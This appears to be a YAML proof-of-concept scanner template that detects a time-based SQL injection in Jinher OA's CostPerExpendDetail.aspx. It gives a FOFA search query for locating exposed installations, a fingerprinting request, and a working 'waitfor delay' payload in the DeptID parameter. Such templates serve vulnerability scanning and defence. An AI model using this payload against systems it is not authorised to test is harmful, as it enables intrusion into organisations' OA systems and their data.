id: poc-yaml-jinher-jhsoft-costperexpenddetail-aspx-sqli
info:
  name: 金和OA CostPerExpendDetail.aspx SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 金和OA
  fofa: app="金和网络-金和OA"
variables:
  t1: random_int(5,10)
  t2: t1 + 2
requests:
- method: GET
  path: /C6/Jhsoft.Web.login/PassWordSlideFull.aspx
  expression: contains(body,"JHSoft")
- method: GET
  path: /c6/JHSoft.Web.CostControl/Cost/CostPerExpendDetail.aspx/?DeptID=1'waitfor+delay%270:0:{{.t1}}%27--
  expression: 'status_code == 200 &&

    contains(gbk_decode(body),"查看还款明细") &&

    contains(gbk_decode(body),"还款人") &&

    contains(gbk_decode(body),"单据编号") &&

    duration >= t1 &&

    duration <= t2

    '
transport: http
